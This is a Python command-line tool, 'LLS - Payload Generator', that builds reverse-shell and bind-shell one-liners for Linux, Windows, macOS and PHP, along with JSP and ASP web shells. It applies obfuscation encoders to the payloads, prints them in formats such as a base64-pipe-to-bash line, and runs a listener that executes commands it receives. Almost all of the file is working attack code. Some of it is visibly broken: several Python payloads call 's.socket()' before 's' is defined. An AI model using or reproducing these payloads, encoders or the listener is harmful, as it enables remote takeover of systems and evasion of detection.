#!/usr/bin/env python3
import sys
import os
import socket
import threading
import time
import base64
import secrets
import random
import subprocess
import json
import hashlib
import logging
import shlex
import signal

if sys.platform == 'win32':
    try:
        import codecs
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
        sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
    except:
        pass

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)


class Encoder:
    """Note: These are obfuscation techniques, NOT real encryption.
       They provide basic encoding for payload obfuscation only."""

    @staticmethod
    def xor_encode(data, key):
        if not key: key = secrets.token_hex(16)
        k = key.encode() if isinstance(key, str) else key
        result = bytes([b ^ k[i % len(k)] for i, b in enumerate(data)])
        return result, key

    @staticmethod
    def multixor_encode(data, key):
        if not key: key = secrets.token_hex(32)
        key_str = str(key)
        keys = [key_str[i:i+8].encode() for i in range(0, len(key_str), 8)][:3]
        while len(keys) < 3: keys.append(secrets.token_bytes(8))
        result = data
        for k in keys:
            try:
                result = Encoder.xor_encode(result, k.decode())[0]
            except Exception as e:
                logger.debug(f"XOR error: {e}")
                result = Encoder.xor_encode(result, secrets.token_hex(16))[0]
        return result, key

    @staticmethod
    def base64_encode(data, key=None):
        return base64.b64encode(data), None

    @staticmethod
    def rot13_encode(data, key=None):
        result = []
        for b in data:
            if 97 <= b <= 122: result.append(((b - 97 + 13) % 26) + 97)
            elif 65 <= b <= 90: result.append(((b - 65 + 13) % 26) + 65)
            elif 48 <= b <= 57: result.append(((b - 48 + 13) % 10) + 48)
            else: result.append(b)
        return bytes(result), None

    @staticmethod
    def caesar_encode(data, key=None):
        shift = 7
        result = []
        for b in data:
            if 97 <= b <= 122: result.append(((b - 97 + shift) % 26) + 97)
            elif 65 <= b <= 90: result.append(((b - 65 + shift) % 26) + 65)
            elif 48 <= b <= 57: result.append(((b - 48 + shift) % 10) + 48)
            else: result.append(b)
        return bytes(result), None

    @staticmethod
    def polymorphic_encode(data, key=None):
        junk1 = bytes(secrets.randbelow(256) for _ in range(random.randrange(15, 35)))
        mutations = bytes(secrets.randbelow(256) for _ in range(len(data)))
        encoded = bytes([data[i] ^ mutations[i] for i in range(len(data))])
        junk2 = bytes(secrets.randbelow(256) for _ in range(random.randrange(15, 35)))
        return junk1 + encoded + junk2, None

    @staticmethod
    def stealth_encode(data, key=None):
        result = bytearray()
        for i, b in enumerate(data):
            if i % 3 == 0: result.append(b ^ 0xAA)
            elif i % 3 == 1: result.append(b ^ 0x55)
            else: result.append(b ^ 0xFF)
        encoded = base64.b64encode(bytes(result))
        return encoded.replace(b'=', b'').replace(b'+', b'x').replace(b'/', b'y'), None

    @staticmethod
    def sgn_encode(data, key=None):
        if not key: key = secrets.token_hex(8)
        key_byte = ord(key[0])
        result = bytearray()
        for b in data:
            result.append(((b ^ key_byte) + (key_byte & 0x0F)) & 0xFF)
            key_byte = (key_byte + 1) & 0xFF
        encoded = base64.b64encode(bytes(result))
        return secrets.token_bytes(10) + encoded + secrets.token_bytes(10), key

    @staticmethod
    def alltheway_encode(data, key=None):
        if not key: key = secrets.token_hex(16)
        key_bytes = key.encode()
        result = bytearray()
        for i, b in enumerate(data):
            result.append(b ^ key_bytes[i % len(key_bytes)])
        result = bytearray([((b + i) & 0xFF) for i, b in enumerate(result)])
        return base64.b64encode(bytes(result)), key

    @staticmethod
    def dynamicXor_encode(data, key=None):
        if not key: key = secrets.token_hex(24)
        key_bytes = key.encode()
        result = bytearray()
        prev = 0
        for i, b in enumerate(data):
            encoded = b ^ key_bytes[i % len(key_bytes)] ^ prev
            result.append(encoded)
            prev = encoded
        return bytes(result), key

    @staticmethod
    def hex_encode(data, key=None):
        return ''.join([f'%02x' % b for b in data]).encode(), None

    @staticmethod
    def unicode_encode(data, key=None):
        return data.decode('utf-8', errors='ignore').encode('utf-16-le'), None


class PayloadDB:
    LINUX_TCP = [
        '/bin/sh -i >& /dev/tcp/{host}/{port} 2>&1',
        'python3 -c "import socket,subprocess,os,pty;s=s.socket();s.connect((\'{host}\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/sh\')"',
        'bash -i >& /dev/tcp/{host}/{port} 0>&1',
        'nc -e /bin/sh {host} {port}',
        'socat exec:\'bash -i\',pty,echo=0,raw tcp:{host}:{port}',
        'python3 -c "import os;os.system(\'nc -e /bin/sh {host} {port}\')"',
    ]

    LINUX_UDP = [
        'python3 -c "import socket,os,pty;s=s.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\'{host}\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/sh\')"',
    ]

    WINDOWS_TCP = [
        'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length))-gt 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$p=(IEX $d 2>&1|Out-String);$b=[Text.Encoding]::ASCII.GetBytes($p+chr(10));$s.Write($b,0,$b.Length)};$c.Close()"',
        'powershell -nop -W Hidden -ExecutionPolicy Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length))-gt 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(IEX $d 2>&1|Out-String);$b=[Text.Encoding]::ASCII.GetBytes($r+\'>> \');$s.Write($b,0,$b.Length)}"',
    ]

    WINDOWS_UDP = [
        'powershell -nop -c "$u=New-Object System.Net.Sockets.UdpClient({port});$u.Connect(\'{host}\',{port});while({{$d=[Text.Encoding]::ASCII.GetBytes((Read-Host)+chr(10));$u.Send($d,$d.Length);$r=$u.Receive([ref][System.Net.IPEndPoint]::Empty);if($r){{IEX ([Text.Encoding]::ASCII.GetString($r))}}}}"'
    ]

    WINDOWS_HIDDEN = [
        'powershell -nop -W Hidden -c "$c=New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length))-gt 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$p=(IEX $d 2>&1|Out-String);$b=[Text.Encoding]::ASCII.GetBytes($p+chr(10));$s.Write($b,0,$b.Length)}"',
    ]

    MACOS_TCP = [
        'python3 -c "import socket,subprocess,os,pty;s=s.socket();s.connect((\'{host}\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/zsh\')"',
    ]

    BIND_SHELL = [
        'nc -lvp {port} -e /bin/sh',
        'python3 -c "import socket,os,pty;s=socket.socket();s.bind((\'\',{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\'/bin/sh\')"',
    ]

    PHP_WEB = [
        'php -r \'$s=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    ]

    JSP_WEB = [
        '<%@ page import="java.io.*" %><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader i = new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=i.readLine())!=null){ out.println(l); } %>',
    ]

    ASP_WEB = [
        '<%@ Page Language="C#" %><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>',
    ]

    PYTHON_IMPLANT = [
        'python3 -c "import socket,subprocess,os,signal;s=s.socket();s.connect((\'{host}\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);signal.signal(signal.SIGINT,lambda s,f:exit());subprocess.call([\'/bin/sh\',\'-i\'])"',
    ]

    @classmethod
    def get(cls, platform, ptype):
        mapping = {
            'linux': {'tcp': cls.LINUX_TCP, 'udp': cls.LINUX_UDP, 'bind': cls.BIND_SHELL},
            'windows': {'tcp': cls.WINDOWS_TCP, 'udp': cls.WINDOWS_UDP, 'hidden': cls.WINDOWS_HIDDEN},
            'macos': {'tcp': cls.MACOS_TCP},
            'bsd': {'tcp': cls.LINUX_TCP},
            'php': {'web': cls.PHP_WEB},
            'jsp': {'web': cls.JSP_WEB},
            'asp': {'web': cls.ASP_WEB},
            'python': {'implant': cls.PYTHON_IMPLANT},
        }
        return mapping.get(platform, {}).get(ptype, cls.LINUX_TCP)


class PayloadGenerator:
    ENCODERS = {
        'none': (lambda d, k: (d, None), 'No encoding'),
        'xor': (Encoder.xor_encode, 'XOR'),
        'multixor': (Encoder.multixor_encode, 'Multi-XOR'),
        'base64': (Encoder.base64_encode, 'Base64'),
        'rot13': (Encoder.rot13_encode, 'ROT13'),
        'caesar': (Encoder.caesar_encode, 'Caesar'),
        'polymorphic': (Encoder.polymorphic_encode, 'Polymorphic'),
        'stealth': (Encoder.stealth_encode, 'Stealth'),
        'sgn': (Encoder.sgn_encode, 'SGN'),
        'alltheway': (Encoder.alltheway_encode, 'AllTheWay'),
        'dynamicxor': (Encoder.dynamicXor_encode, 'DynamicXOR'),
        'hex': (Encoder.hex_encode, 'Hex'),
        'unicode': (Encoder.unicode_encode, 'Unicode'),
    }

    @classmethod
    def generate(cls, platform, ptype, host, port, encoder='none', key=None):
        templates = PayloadDB.get(platform, ptype)
        template = secrets.choice(templates)
        payload = template.replace('{host}', str(host)).replace('{port}', str(port)).encode()

        enc_func = cls.ENCODERS.get(encoder, cls.ENCODERS['none'])[0]
        return enc_func(payload, key)


class PayloadVerifier:
    @staticmethod
    def verify(payload):
        result = {'valid': True, 'type': 'unknown', 'size': len(payload), 'warnings': []}
        try:
            decoded = payload.decode('utf-8', errors='ignore')
            if 'powershell' in decoded.lower(): result['type'] = 'powershell'
            elif 'python' in decoded.lower(): result['type'] = 'python'
            elif '/bin/sh' in decoded or '/bin/bash' in decoded: result['type'] = 'bash'
            if len(decoded) < 20: result['warnings'].append('Short')
        except Exception as e:
            logger.debug(f"Verification error: {e}")
            result['type'] = 'binary'
        return result


class PacketProtocol:
    MAX_SIZE = 131072
    TIMEOUT = 60
    CHALLENGE_SIZE = 32

    @staticmethod
    def recv_exact(sock, n):
        """Receive exactly n bytes"""
        data = bytearray()
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data.extend(chunk)
        return bytes(data)

    @staticmethod
    def send(sock, data):
        try:
            length = len(data)
            sock.sendall(length.to_bytes(4, 'big'))
            sock.sendall(data)
            return True
        except Exception as e:
            logger.error(f"Send failed: {e}")
            return False

    @staticmethod
    def recv(sock):
        try:
            header = PacketProtocol.recv_exact(sock, 4)
            if not header:
                return None
            length = int.from_bytes(header, 'big')
            if length > PacketProtocol.MAX_SIZE or length < 0:
                logger.error(f"Invalid length: {length}")
                return None
            data = bytearray()
            while len(data) < length:
                chunk = sock.recv(min(length - len(data), 8192))
                if not chunk:
                    return None
                data.extend(chunk)
            return bytes(data)
        except Exception as e:
            logger.error(f"Receive error: {e}")
            return None


class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.RLock()
        self.counter = 0

    def create(self, client, addr):
        with self.lock:
            self.counter += 1
            sid = self.counter
            self.sessions[sid] = {
                'client': client,
                'addr': addr,
                'commands': 0,
                'created': time.time()
            }
            return sid

    def remove(self, sid):
        with self.lock:
            if sid in self.sessions:
                try:
                    self.sessions[sid]['client'].close()
                except Exception:
                    pass
                del self.sessions[sid]

    def get(self):
        with self.lock:
            return [(sid, s['addr'], s['commands']) for sid, s in self.sessions.items()]

    def count(self):
        with self.lock:
            return len(self.sessions)


class AuthHandler:
    """Simple challenge-response auth"""
    @staticmethod
    def generate_challenge():
        return secrets.token_hex(16)

    @staticmethod
    def hash_password(password, challenge):
        """Simple hash - not crypto-secure but better than plaintext"""
        combined = f"{password}:{challenge}".encode()
        return hashlib.sha256(combined).hexdigest()


class Listener:
    def __init__(self, host, port, password=None):
        self.host = host
        self.port = port
        self.password = password
        self.server = None
        self.running = False
        self.sessions = SessionManager()
        self.lock = threading.Lock()
        self._shutdown_event = threading.Event()

    def start(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(50)
            self.server.settimeout(1)
            self.running = True
            logger.info(f"Listener: {self.host}:{self.port}")
            print(f"[*] Listening on {self.host}:{self.port}")

            while self.running and not self._shutdown_event.is_set():
                try:
                    client, addr = self.server.accept()
                    threading.Thread(target=self.handle, args=(client, addr), daemon=True).start()
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        logger.error(f"Accept error: {e}")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            self.stop()

    def handle(self, client, addr):
        sid = None
        try:
            client.settimeout(PacketProtocol.TIMEOUT)

            if self.password:
                challenge = AuthHandler.generate_challenge()
                client.send(f"CHALLENGE:{challenge}".encode())

                auth_data = PacketProtocol.recv(client)
                if not auth_data:
                    client.close()
                    return

                try:
                    auth = json.loads(auth_data.decode())
                    expected_hash = AuthHandler.hash_password(self.password, challenge)
                    if auth.get('hash') != expected_hash:
                        client.send(b"AUTH_FAIL")
                        client.close()
                        return
                except Exception as e:
                    logger.debug(f"Auth parse error: {e}")
                    client.close()
                    return

                client.send(b"AUTH_OK")

            sid = self.sessions.create(client, addr)
            print(f"[+] Session {sid} from {addr[0]}:{addr[1]}")
            client.send(b"CONNECTED")

            while self.running and not self._shutdown_event.is_set():
                try:
                    client.settimeout(PacketProtocol.TIMEOUT)
                    data = PacketProtocol.recv(client)
                    if not data:
                        break

                    try:
                        cmd_data = json.loads(data.decode())
                        cmd = cmd_data.get('cmd', '')
                    except Exception:
                        cmd = data.decode('utf-8', errors='ignore').strip()

                    if not cmd:
                        continue

                    if cmd == 'exit':
                        break
                    if cmd == 'quit':
                        break

                    result = self.execute(cmd)
                    response = json.dumps({'output': result}).encode()
                    PacketProtocol.send(client, response)

                    with self.sessions.lock:
                        if sid in self.sessions.sessions:
                            self.sessions.sessions[sid]['commands'] += 1

                except socket.timeout:
                    continue
                except Exception as e:
                    logger.debug(f"Command error: {e}")
                    break

        except Exception as e:
            logger.error(f"Handler error: {e}")
        finally:
            if sid:
                self.sessions.remove(sid)
            try:
                client.close()
            except Exception:
                pass
            if addr:
                print(f"[-] Disconnected {addr[0]}:{addr[1]}")

    def execute(self, cmd):
        if not cmd:
            return "Empty command"
        if len(cmd) > 2000:
            return "Command too long"

        dangerous_patterns = [
            'rm -rf /',
            ':(){:|:&};:',
            'mkfs',
            'dd if=/dev/zero',
            'chmod 000',
            '> /etc/passwd',
            '> /etc/shadow',
        ]

        cmd_lower = cmd.lower()
        for pattern in dangerous_patterns:
            if pattern in cmd_lower:
                return "Blocked: dangerous command"

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=os.path.expanduser('~')
            )
            output = result.stdout + result.stderr
            return output[:32000] if output else "Done"
        except subprocess.TimeoutExpired:
            return "Timeout"
        except FileNotFoundError:
            return "Command not found"
        except Exception as e:
            return f"Error: {str(e)}"

    def stop(self):
        self.running = False
        self._shutdown_event.set()

        with self.sessions.lock:
            for sid in list(self.sessions.sessions.keys()):
                try:
                    self.sessions.sessions[sid]['client'].close()
                except Exception:
                    pass
            self.sessions.sessions.clear()

        if self.server:
            try:
                self.server.close()
            except Exception:
                pass
        print("[*] Listener stopped")


class CLI:
    def __init__(self):
        self.payload = None
        self.info = {}
        self.listener = None

    def banner(self):
        print("""
╦  ╦  ╔═╗
║  ║  ╚═╗   - if u steal this code you skid - 
╩═╝╩═╝╚═╝  
    LLS - Payload Generator
""")

    def help(self):
        print("""
  gen <platform> <type> <host> <port> [encoder] [key]
      platforms: linux, windows, macos, bsd, php, jsp, asp, python
      types:     tcp, udp, bind, hidden, web, implant

  encoders    - Show all encoders
  verify      - Verify payload
  out <fmt>   - hex, c, python, powershell, bash, raw, url
  save <file> - Save to file
  listen <host> <port> [pass] - Start listener
  shells      - Show sessions
  info        - Payload info
  clear       - Clear
  help        - Help
  exit        - Exit
""")

    def gen(self, args):
        if len(args) < 4:
            print("[!] Usage: gen <platform> <type> <host> <port> [encoder]")
            return

        try:
            platform, ptype, host, port = args[0].lower(), args[1].lower(), args[2], int(args[3])
            encoder = args[4].lower() if len(args) > 4 else 'none'
            key = args[5] if len(args) > 5 else None

            self.payload, used_key = PayloadGenerator.generate(platform, ptype, host, port, encoder, key)
            self.info = {
                'platform': platform,
                'type': ptype,
                'host': host,
                'port': port,
                'encoder': encoder,
                'key': used_key,
                'size': len(self.payload)
            }

            print(f"\n[+] Generated: {platform} {ptype} -> {host}:{port}")
            print(f"    Encoder: {encoder} | Size: {len(self.payload)} bytes")
            preview = self.payload.decode('utf-8', errors='ignore')[:200]
            print(f"\n{preview}")
            if len(self.payload) > 200:
                print("...")
            print("\n[*] Use 'out <format>'")
        except Exception as e:
            print(f"[!] Error: {e}")

    def encoders(self):
        print("\n[ENCODERS]:")
        for name, (_, desc) in PayloadGenerator.ENCODERS.items():
            print(f"  {name:15} - {desc}")

    def verify(self):
        if not self.payload:
            print("[!] No payload")
            return
        result = PayloadVerifier.verify(self.payload)
        print(f"\n[VERIFY]: Size={result['size']} Type={result['type']}")
        if result['warnings']:
            print(f"  Warnings: {result['warnings']}")

    def out(self, args):
        if not self.payload or not args:
            print("[!] Usage: out <format>")
            return

        fmt = args[0].lower()
        p = self.payload
        print(f"\n[{fmt.upper()}]:\n")

        try:
            if fmt == 'hex':
                print(''.join([f'\\x{b:02x}' for b in p]))
            elif fmt == 'c':
                print("unsigned char p[] = {")
                for i in range(0, len(p), 16):
                    print("  " + ", ".join([f"0x{b:02x}" for b in p[i:i+16]]) + ",")
                print(f"}}; // {len(p)} bytes")
            elif fmt == 'python':
                hex_str = ''.join([f'\\x{b:02x}' for b in p])
                print(f'payload = b"{hex_str}"')
            elif fmt == 'powershell':
                print(f"$p = [byte[]]@({','.join([str(b) for b in p])})")
            elif fmt == 'bash':
                print(f"echo '{base64.b64encode(p).decode()}' | base64 -d | bash")
            elif fmt == 'raw':
                print(p.decode('utf-8', errors='ignore'))
            elif fmt == 'url':
                print(''.join(['%' + format(b, '02x') for b in p]))
            else:
                print(f"[!] Unknown: {fmt}")
        except Exception as e:
            print(f"[!] Error: {e}")

    def save(self, args):
        if not self.payload or not args:
            print("[!] Usage: save <filename>")
            return
        try:
            with open(args[0], 'wb') as f:
                f.write(self.payload)
            print(f"[+] Saved: {args[0]}")
        except Exception as e:
            print(f"[!] Error: {e}")

    def listen(self, args):
        if len(args) < 2:
            print("[!] Usage: listen <host> <port> [password]")
            return

        host, port = args[0], int(args[1])
        password = args[2] if len(args) > 2 else None

        if self.listener and self.listener.running:
            print("[!] Already running")
            return

        self.listener = Listener(host, port, password)
        threading.Thread(target=self.listener.start, daemon=True).start()
        print(f"[*] Started: {host}:{port}")
        if password:
            print("[*] Password protection enabled")

    def shells(self):
        if not self.listener or not self.listener.sessions.count():
            print("[!] No sessions")
            return
        print("\n[SESSIONS]:")
        for sid, addr, cmds in self.listener.sessions.get():
            print(f"  {sid}: {addr[0]}:{addr[1]} | Commands: {cmds}")

    def info(self):
        if not self.info:
            print("[!] No payload")
            return
        print(f"\n[INFO]: {self.info['platform']} {self.info['type']}")
        print(f"  Target: {self.info['host']}:{self.info['port']}")
        print(f"  Encoder: {self.info['encoder']}")
        print(f"  Key: {self.info['key']}")
        print(f"  Size: {self.info['size']}")

    def run(self):
        self.banner()
        print("[*] Commands: help\n")

        while True:
            try:
                cmd = input("[LLS] > ").strip()
                if not cmd:
                    continue

                try:
                    parts = shlex.split(cmd)
                except ValueError as e:
                    print(f"[!] Parse error: {e}")
                    continue

                if not parts:
                    continue

                c, args = parts[0], parts[1:]

                if c == 'exit':
                    if self.listener:
                        self.listener.stop()
                    break
                elif c == 'help':
                    self.help()
                elif c == 'gen':
                    self.gen(args)
                elif c == 'encoders':
                    self.encoders()
                elif c == 'verify':
                    self.verify()
                elif c in ['out', 'output']:
                    self.out(args)
                elif c == 'save':
                    self.save(args)
                elif c in ['listen', 'l']:
                    self.listen(args)
                elif c == 'shells':
                    self.shells()
                elif c == 'info':
                    self.info()
                elif c in ['clear', 'cls']:
                    self.banner()
                else:
                    print(f"[!] Unknown: {c}")

            except KeyboardInterrupt:
                print("\n[*] exit to quit")
            except EOFError:
                break
            except Exception as e:
                print(f"[!] Error: {e}")

        print("[*] Bye!")


if __name__ == '__main__':
    CLI().run()
